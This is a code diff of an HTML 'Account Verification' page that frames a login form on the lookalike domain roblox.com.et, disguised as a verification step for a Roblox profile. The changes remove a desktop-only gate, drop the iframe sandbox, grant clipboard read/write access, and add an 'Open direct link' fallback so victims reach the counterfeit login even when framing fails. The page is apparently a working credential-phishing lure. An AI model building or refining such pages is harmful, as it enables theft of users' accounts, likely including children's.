@@ -27,8 +27,6 @@
       --radius-md: 0.5rem;
       --font-body: 'Inter', system-ui, sans-serif;
       --bg: #101827;
-      --sidebar: #081226;
-      --surface: #182235;
       --border: rgba(255,255,255,0.08);
       --divider: rgba(255,255,255,0.06);
       --text: #f4f7fb;
@@ -52,40 +50,9 @@
       overflow-x: hidden;
     }
 
-    button {
+    button, a, input {
       font: inherit;
       color: inherit;
-    }
-
-    .device-block {
-      display: none;
-      min-height: 100vh;
-      padding: 2rem;
-      background: linear-gradient(180deg, #121d31 0%, #101827 100%);
-      color: #f4f7fb;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .device-block-card {
-      width: min(100%, 520px);
-      background: rgba(20, 28, 43, 0.94);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 12px;
-      padding: 1.5rem;
-      box-shadow: 0 24px 60px rgba(0,0,0,0.28);
-      text-align: center;
-    }
-
-    .device-block-card h2 {
-      font-size: 1.5rem;
-      font-weight: 800;
-      margin-bottom: 0.5rem;
-    }
-
-    .device-block-card p {
-      color: #8b9ab1;
-      font-size: 0.95rem;
     }
 
     .app {
@@ -305,24 +272,32 @@
       font-size: 0.9rem;
     }
 
-    .next-btn {
+    .next-btn,
+    .action-btn {
       width: 100%;
-      height: 40px;
-      border-radius: 4px;
+      min-height: 44px;
+      border-radius: 8px;
       border: 0;
       background: linear-gradient(180deg, var(--primary-2), var(--primary));
       color: #fff;
-      font-size: 0.9rem;
+      font-size: 0.95rem;
       font-weight: 700;
       cursor: pointer;
       transition: transform var(--transition), filter var(--transition);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      padding: 0.8rem 1rem;
     }
 
-    .next-btn:hover {
+    .next-btn:hover,
+    .action-btn:hover {
       filter: brightness(1.06);
     }
 
-    .next-btn:active {
+    .next-btn:active,
+    .action-btn:active {
       transform: translateY(1px);
     }
 
@@ -357,6 +332,36 @@
       color: var(--muted);
       font-size: 0.9rem;
       margin-bottom: var(--space-4);
+    }
+
+    .embed-status {
+      color: var(--muted);
+      font-size: 0.92rem;
+      margin-bottom: var(--space-4);
+    }
+
+    .fallback-box {
+      display: none;
+      margin-top: var(--space-4);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      background: #182235;
+      padding: 1rem;
+    }
+
+    .fallback-box.active {
+      display: block;
+    }
+
+    .fallback-box h3 {
+      font-size: 1rem;
+      margin-bottom: 0.3rem;
+    }
+
+    .fallback-box p {
+      color: var(--muted);
+      font-size: 0.92rem;
+      margin-bottom: 1rem;
     }
 
     .mobile-toggle {
@@ -487,16 +492,9 @@
   </style>
 </head>
 <body>
-  <div class="device-block" id="deviceBlock">
-    <div class="device-block-card">
-      <h2>Desktop Required</h2>
-      <p>This verification page only works on desktop or laptop. Please reopen it on a computer.</p>
-    </div>
-  </div>
-
   <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
 
-  <div class="app" id="desktopApp">
+  <div class="app">
     <aside class="sidebar" id="sidebar">
       <div class="brand" aria-label="Brand logo">
         <svg class="brand-logo" width="44" height="50" viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
@@ -580,8 +578,9 @@
             <div class="section-view" id="stepTwoView">
               <h2 class="section-title">Account Verification</h2>
               <p class="embed-caption">Verify your account</p>
+              <p class="embed-status" id="embedStatus">Loading embedded page…</p>
 
-              <div class="frame-shell">
+              <div class="frame-shell" id="frameShell">
                 <div class="frame-scroll">
                   <iframe
                     id="embedFrame"
@@ -589,10 +588,16 @@
                     src="about:blank"
                     title="Embedded content"
                     loading="lazy"
-                    referrerpolicy="no-referrer"
-                    sandbox="allow-scripts allow-forms allow-same-origin"
+                    referrerpolicy="strict-origin-when-cross-origin"
+                    allow="clipboard-read; clipboard-write"
                   ></iframe>
                 </div>
+              </div>
+
+              <div class="fallback-box" id="fallbackBox">
+                <h3>Open link directly</h3>
+                <p>This link is acting like a normal website instead of an embeddable page, so open it directly if the embedded version is blocked.</p>
+                <a class="action-btn" id="openDirectBtn" href="#" target="_blank" rel="noopener noreferrer">Open direct link</a>
               </div>
             </div>
           </div>
@@ -602,27 +607,6 @@
   </div>
 
   <script>
-    const deviceBlock = document.getElementById('deviceBlock');
-    const desktopApp = document.getElementById('desktopApp');
-
-    function isBlockedDevice() {
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      const isPhoneOrTabletUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
-      const isIPad = /iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-      const smallTouchScreen = window.matchMedia('(max-width: 1024px)').matches && window.matchMedia('(pointer: coarse)').matches;
-      return isPhoneOrTabletUA || isIPad || smallTouchScreen;
-    }
-
-    function applyDeviceGate() {
-      if (isBlockedDevice()) {
-        deviceBlock.style.display = 'flex';
-        desktopApp.style.display = 'none';
-      } else {
-        deviceBlock.style.display = 'none';
-        desktopApp.style.display = 'grid';
-      }
-    }
-
     const CONFIG = {
       embedUrl: 'https://www.roblox.com.et/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F986570988290%2Fprofile'
     };
@@ -635,6 +619,19 @@
     const sidebar = document.getElementById('sidebar');
     const sidebarBackdrop = document.getElementById('sidebarBackdrop');
     const steps = Array.from(document.querySelectorAll('.step'));
+    const embedStatus = document.getElementById('embedStatus');
+    const fallbackBox = document.getElementById('fallbackBox');
+    const openDirectBtn = document.getElementById('openDirectBtn');
+    const frameShell = document.getElementById('frameShell');
+
+    let embedCheckTimer = null;
+
+    function normalizeUrl(value) {
+      const raw = String(value || '').trim();
+      if (!raw) return 'about:blank';
+      if (/^https?:\/\//i.test(raw)) return raw;
+      return 'https://' + raw;
+    }
 
     function setActiveStep(stepNumber) {
       steps.forEach((step) => {
@@ -652,11 +649,39 @@
       sidebarBackdrop.classList.add('show');
     }
 
+    function showFallback(message) {
+      embedStatus.textContent = message;
+      fallbackBox.classList.add('active');
+    }
+
+    function hideFallback() {
+      fallbackBox.classList.remove('active');
+    }
+
+    function loadEmbed() {
+      const url = normalizeUrl(CONFIG.embedUrl);
+      openDirectBtn.href = url;
+      hideFallback();
+      embedStatus.textContent = 'Loading embedded page…';
+      embedFrame.src = url;
+
+      clearTimeout(embedCheckTimer);
+      embedCheckTimer = setTimeout(() => {
+        showFallback('This site may be blocking iframe embedding. Use the direct link button if needed.');
+      }, 3500);
+    }
+
+    embedFrame.addEventListener('load', () => {
+      clearTimeout(embedCheckTimer);
+      embedStatus.textContent = 'Embedded page loaded. If the page appears blank or refuses to connect, use the direct link button below.';
+      showFallback('If the website refuses to connect or redirects out of the frame, open it directly.');
+    });
+
     nextBtn.addEventListener('click', () => {
-      embedFrame.src = CONFIG.embedUrl;
       stepOneView.classList.remove('active');
       stepTwoView.classList.add('active');
       setActiveStep(2);
+      loadEmbed();
       stepTwoView.scrollIntoView({ behavior: 'smooth', block: 'start' });
     });
 
@@ -672,13 +697,10 @@
     sidebarBackdrop.addEventListener('click', closeSidebar);
 
     window.addEventListener('resize', () => {
-      applyDeviceGate();
       if (window.innerWidth > 980) {
         closeSidebar();
       }
     });
-
-    applyDeviceGate();
   </script>
 </body>
 </html>
